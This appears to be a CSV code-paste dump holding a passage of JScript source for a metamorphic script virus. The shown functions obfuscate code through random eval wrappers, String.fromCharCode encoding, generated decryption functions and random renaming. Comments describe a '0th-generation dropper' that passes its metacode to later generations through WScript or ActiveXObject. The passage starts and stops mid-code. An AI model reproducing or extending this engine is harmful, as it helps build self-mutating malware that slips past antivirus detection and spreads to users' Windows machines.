id,title,username,language,date,content
         return(FullArray[OriginalNum][Math.floor(Math.random()*FAElement)]);
    }

    var CreateNumericRnd=Math.abs(Math.floor(Math.random()*0.9*OriginalNum))+1;

    if(OriginalNum<CreateNumericRnd&&CreateNumericType==0)
    {
        return(DeriveVC(OriginalNum,86));
    }
    if(CreateNumericType==0)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum-CreateNumericRnd)+'+'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==1)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum+CreateNumericRnd)+'-'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==2)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum*CreateNumericRnd)+'/'+CreateNumeric(CreateNumericRnd),200)+')');
    }

    return(DeriveVC(OriginalNum,86));    
}


function CreateLogic(LogicValues)  // fCreateLogic
{
// LogicValue=VC!VC!operator
    DeriveRestrString=''; // clear it
    var argument1     =LogicValues.substring(0,LogicValues.indexOf('!'));
    var argument2     =LogicValues.substring(LogicValues.indexOf('!')+1,LogicValues.indexOf('?'));
    var logicoperator =LogicValues.substring(LogicValues.indexOf('?')+1);
    var antilogic     =GetAntiLogic(logicoperator);
  
    CLDeriv=DeriveRestrictVC;     // use function-references
    if(isNumber(argument2)==1){CLDeriv=DeriveVC;}

    if(NoDerivation1==0)
    {
        argument1=DeriveRestrictVC(argument1,24);
    }
    argument2=CLDeriv(argument2,24);

    RNum1=Math.floor(Math.random()*2);
    if(RNum1==0)
    {
        CreateLogicRV=argument1+logicoperator+argument2;
    }
    if(RNum1==1)
    {
        CreateLogicRV=argument2+antilogic+argument1;
    }    
    return(CreateLogicRV);
}



function DeriveVC(arg,probalility)  // fDeriveVC
{
    var RNum2=Math.floor(Math.random()*probalility);
    //RNum2=13;  // debugging
    if(RNum2<10) // VC -> value
    {
        var DVCTmpName=randomString();
        VarDefs.push(arg);
        VarNames.push(DVCTmpName);
        var Rname1=DeriveVC(DVCTmpName,60);
        return(Rname1);
    }
    return(arg);
}



function GetVariableList(CodeStringWithMask)  // fGetVariableList 
{    
    var VarListRV="""";
    while(CodeStringWithMask.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarListRV+=CodeStringWithMask.substring(CodeStringWithMask.indexOf('°+'),CodeStringWithMask.indexOf('+°')+2)+"",""; // (ccc)
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return(""_*_*""+VarListRV.substring(0,VarListRV.length-1)+""*_*_"")
}



function RemoveVariableIndicator(CodeStringWithMask)  // fRemoveVariableIndicator
{    
    while(CodeStringWithMask.indexOf('_*_*')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.substring(0,CodeStringWithMask.indexOf('_*_*'))+CodeStringWithMask.substring(CodeStringWithMask.indexOf('*_*_')+4);
    }
    return(CodeStringWithMask);
}


function DeriveRestrictVC(arg,probalility,novars)  // fDeriveRestrictVC   
{
    var WhichRnd=Math.floor(Math.random()*probalility)
    if(arg.toString().indexOf(""eval("")!=-1){WhichRnd+=7;}      
    if(WhichRnd>10)
    {
        return(arg);
    }
    
    var RndString=randomString();
    if(WhichRnd>8&&novars!=1)
    {
        if(r(2)==0)
        {
            DeriveRestrString+=""var ""+RndString+'='+arg+'@;';
        }
        else
        {
            DeriveRestrString=""var ""+RndString+'='+arg+'@;'+DeriveRestrString;
        }
        return(RndString);
    }
    if(WhichRnd>6) // VC -> value
    {
        var VariableString=GetVariableList(arg.toString())
        arg=RemoveVariableMask(arg.toString());
        arg=RemoveVariableIndicator(arg);
        return('eval('+CreateString(arg)+')'+VariableString);
    }  
    var VariableList=[];
    var VariableListRnd=[];
    arg=CreateVariableListForFunctionCalls(arg,VariableList,VariableListRnd)
    FunctionNames.push(RndString);
    FunctionArgs.push('('+VariableListRnd.join()+')');
    FunctionDefs.push('return '+arg);
    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }
    return(RndString+'('+ReturnValue+')');
}



function CreateVariableListForFunctionCalls(CodeString,VarArrOrig,VarArrRnd)  // fCreateVariableListForFunctionCalls
{
    CopyexecCode=CodeString.toString();
    while(CopyexecCode.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarArrOrig.push(CopyexecCode.substring(CopyexecCode.indexOf('°+')+2,CopyexecCode.indexOf('+°')));
        CopyexecCode=CopyexecCode.substring(CopyexecCode.indexOf('+°')+2);
    }
    for(var i=0;i<VarArrOrig.length;i++)    // remove every variable with a new argument-name
    {
        var RandNameForFuncArg=randomString();
        VarArrRnd.push(RandNameForFuncArg);
        while(CodeString.indexOf(VarArrOrig[i])!=-1)
        {
            CodeString=CodeString.replace(VarArrOrig[i],RandNameForFuncArg);
        }
    }
    return(CodeString);
}


function CreateExecution(execCode,noFunctionCreation)  // fCreateExecution        
{
    var RNum4=Math.floor(Math.random()*8);

    if(noFunctionCreation==1)
    {
        RNum4=Math.floor(Math.random()*5);
    }
   
    if(RNum4<2)
    {
        return(execCode);
    }
    
    if(RNum4<5&&execCode.substring(0,7)!='return(')
    {        
        var VariableString=GetVariableList(execCode)
        execCode=RemoveVariableMask(execCode);
        execCode=RemoveVariableIndicator(execCode);                          
        return('eval('+CreateString(execCode)+')'+VariableString);
    }
    
    if(execCode.indexOf(""eval("")!=-1){return(execCode);}
    
    var Rname5=randomString();

    if(RecordFunctionVariables==0)  // first initialisation
    {
        RecordFunctionFN=FunctionNames.length;
        RecordFunctionVN=VarNames.length;     
        FunctionVariableFctName.push(Rname5);
    }
    RecordFunctionVariables++;

    var VariableList=[];
    var VariableRndList=[];
    execCode=CreateVariableListForFunctionCalls(execCode,VariableList,VariableRndList)

    FunctionDefs.push(CreateExecution(execCode));
    FunctionNames.push(Rname5);
    FunctionArgs.push('('+VariableRndList.join()+')');
    RecordFunctionVariables--;

    if(RecordFunctionVariables==0)  // final summing up of variable/function names
    {
        RecordFctNames=FunctionNames.slice(RecordFunctionFN);
        RecordVarNames=VarNames.slice(RecordFunctionVN);
        FunctionVariableNameArray.push(RecordVarNames.concat(RecordFctNames));
    }

    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }

    if(execCode.substring(0,7)=='return(')
    {
        return('return '+Rname5+'('+ReturnValue+')')
    }

    return(Rname5+'('+ReturnValue+')');
}


function CreateString(plainString)  // fCreateString
{
    var InString=plainString;
    var RNum6=Math.floor(Math.random()*InString.length/6);
    if(InString.length>1000)               // new
    {
        RNum6=Math.floor(Math.random()*InString.length/50);
    }
    for(i=0;i<RNum6;i++)
    {
        RNum7=Math.floor(Math.random()*InString.length);
        InString=InString.substring(0,RNum7)+'@@'+InString.substring(RNum7);
    }
    while(InString.indexOf('@@@@')!=-1)    // just in 1st gen... may it help??
    {
        InString=InString.replace('@@@@','@@');
    }
    var SplitStr=InString.split('@@');
    var RVstring='';
    for(var j=0;j<SplitStr.length;j++)
    {
        var RNum8=Math.floor(Math.random()*20);
        RNum8=1;  // *** debug
        if(RNum8<5)
        {
            while(SplitStr[j].indexOf(s(39))!=-1)
            {
                SplitStr[j]=SplitStr[j].replace(s(39),s(35)+s(35)+s(35)+'+String.fromCharCode(39)+'+s(35)+s(35)+s(35))   // new             
            }
            while(SplitStr[j].indexOf(s(35)+s(35)+s(35))!=-1)            // new
            {
                SplitStr[j]=SplitStr[j].replace(s(35)+s(35)+s(35),s(39))       // new         
            }
            RVstring+=s(39)+SplitStr[j]+s(39)+'+';
        }
        if(RNum8>4&&RNum8<8)
        {
            var Rname6=randomString();
            VarDefs.push(CreateString(SplitStr[j]));
            VarNames.push(Rname6);
            RVstring+=DeriveVC(Rname6,24)+'+';
        }        
        if(RNum8>7)
        {
            var TmpCharCode='';
            for(k=0;k<SplitStr[j].length;k++)
            {
                TmpCharCode+=CreateNumeric(SplitStr[j].charCodeAt(k))+',';
            }
            TmpCharCode=TmpCharCode.substr(0,TmpCharCode.length-1);                     
            RVstring+='String.fromCharCode('+TmpCharCode+')+';
        }
    }
    return(RVstring.substring(0,RVstring.length-1));
}


function PreCompilation()  // fPreCompilation - not a function anymore
{
    // Make random bruteforce decryption functions

    FullArray=[];    
    for(var FillA=0;FillA<256;FillA++)
    {
        FullArray.push([FillA]);
    }
    
    for(var NumberOfFunctionCreation=0;NumberOfFunctionCreation<75;NumberOfFunctionCreation++)
    {
        F='(SOS)O(SOS)';
        while(F.indexOf('S')!=-1)
        {
            if(r(4)==0)
            {
                F=F.replace('S','(SOS)')
            }
            else
            {
                F=F.replace('S','X');
            }
        }
        
        while(F.indexOf('O')!=-1)
        {
            var OperatorArray=['+','+','-','-','*','%']
            F=F.replace('O',OperatorArray[r(6)]);
        }
        
        var FunctionArguments=[];
        var FunctionArgLength=r(4)+2;
        for(var RSc=0;RSc<FunctionArgLength;RSc++)
        {
            FunctionArguments.push(randomString());
        }
        
        while(F.indexOf('X')!=-1)
        {
            if(r(2)==0)
            {   
                F=F.replace('X',FunctionArguments[r(FunctionArguments.length)]);
            }
            else
            {
                F=F.replace('X',r(256));
            }
        }
        
        for(var VarCount=FunctionArguments.length;VarCount>=0;VarCount--)
        {
            if(F.indexOf(FunctionArguments[VarCount])==-1)
            {
                FunctionArguments.splice(VarCount,1);
            }
        }
        
        if(FunctionArguments.length>0)
        {
            var Fname=randomString();
            G='function '+Fname+'('+FunctionArguments.join()+'){return('+F+');}';
        
            eval(G);   
            var IsItAUsefulFunction=0;
            
            for(var EvalFctC=0;EvalFctC<100;EvalFctC++)
            {
                FFilledArguments=[]
                for(var FFc=0;FFc<FunctionArguments.length;FFc++)
                {
                    FFilledArguments.push(r(256))    
                }
                
                FCall=Fname+'('+FFilledArguments.join()+')';

                FResult=eval(FCall);   
                if(FResult>=0&&FResult<256)
                {
                    IsItAUsefulFunction=1;
                    FullArray[FResult].push(FCall);
                }
            }
            
            if(IsItAUsefulFunction==1)
            {
                FunctionDefs.push('return '+F);
                FunctionArgs.push('('+FunctionArguments.join()+')');  
                FunctionNames.push(Fname); 
            }
        }
    }   

    // Make some instruction definition
    while(MetaLevelLanguage.indexOf(""$CreateObject$"")!=-1)
    {
        if(Math.floor(Math.random()*2)==0)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(""$CreateObject$"",""WScript#.CreateObject"");
        }
        else
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(""$CreateObject$"",""new ActiveXObject"");
        }
    }
    
      
    // Define random variable names 
    /*
    // This feature should not be activated in the 0th-generation dropper
    // because it might interfere with the ""victory""-instruction, which is
    // responsible for including the metacode to the next generation. Therefor the
    // dropped output can can still be understood relatively simple (you can
    // compare the used variables with the variables in the meta-code and understand
    // further the code - this is how i did the first stage of bug-fixing), so it can
    // be used to learn about the mutations in general. This feature is just
    // deactivated in this 0-generation dropper - everything is fully activated
    // in every further generation. (in fact this is no fundamental problem, but
    // it could be solved relativly quick. but i'm just to lazy to optimize the
    // dropper :))    
    var CopyMetaLevelLanguage=MetaLevelLanguage;
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')var',')def');
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(var',')while(');   // also consider while(var VariableName=...)     
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(',')def');  
    while(CopyMetaLevelLanguage.indexOf(')def ')!=-1)
    {
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf(')def ')+1);
        var VariableNameGlobal=CopyMetaLevelLanguage.substring(4,CopyMetaLevelLanguage.indexOf('='));
        var RandomVariableName=randomString();
        while(MetaLevelLanguage.indexOf(VariableNameGlobal)!=-1)
